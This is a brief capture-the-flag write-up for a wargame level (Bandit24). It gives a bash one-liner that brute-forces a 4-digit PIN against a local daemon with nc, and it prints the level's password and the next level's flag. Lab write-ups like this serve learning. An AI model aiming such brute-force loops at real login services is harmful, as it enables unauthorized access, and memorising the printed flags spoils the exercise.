<h1>Bandit24</h1>

<b>Goal:</b>

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

<b>Solution:</b>

You can create a bash script to output all combos to brute force this but it can also be done with a bash one liner. 

<code>for i in $(seq -w 0000 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i; done \| nc localhost 30002</code>

<details>
	<summary>Flag:</summary>

	uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

</details>